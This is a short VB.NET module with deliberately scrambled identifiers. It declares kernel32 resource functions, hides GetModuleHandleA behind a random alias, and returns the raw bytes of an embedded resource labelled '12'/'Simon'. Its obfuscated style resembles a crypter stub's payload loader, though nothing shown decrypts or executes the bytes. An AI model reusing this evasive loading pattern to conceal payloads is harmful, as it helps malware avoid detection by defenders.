﻿Imports System.Runtime.InteropServices
Module gsoijdMkeytY
    <DllImport("kernel32.dll", SetLastError:=True)> _
    Private Function FindResource(ByVal ZlsTnllYezlL As IntPtr, ByVal lpName As String, ByVal lpType As String) As IntPtr
    End Function
    Private Declare Function JNBJGAPChMdi Lib "kernel32" Alias "GetModuleHandleA" (ByVal moduleName As String) As IntPtr
    Private Declare Function SizeofResource Lib "kernel32" (ByVal ZlsTnllYezlL As IntPtr, ByVal hResInfo As IntPtr) As Integer
    Private Declare Function LoadResource Lib "kernel32" (ByVal ZlsTnllYezlL As IntPtr, ByVal hResInfo As IntPtr) As IntPtr
    Public Function CoqalHyeEZps(ByVal MVHjXxNPwlcC As String) As Byte()
        Dim ZlsTnllYezlL As IntPtr = JNBJGAPChMdi(MVHjXxNPwlcC)
        Dim PcOKouMcMJaW As IntPtr = FindResource(ZlsTnllYezlL, "12", "Simon")
        Dim JDDcSAvEjWmg As IntPtr = LoadResource(ZlsTnllYezlL, PcOKouMcMJaW)
        Dim FOLUbFmExmUo = SizeofResource(ZlsTnllYezlL, PcOKouMcMJaW)
        Dim fEUUehyJxiz As Byte() = New Byte(FOLUbFmExmUo - 1) {}
        Marshal.Copy(JDDcSAvEjWmg, fEUUehyJxiz, 0, CInt(FOLUbFmExmUo))
        Return fEUUehyJxiz
    End Function
End Module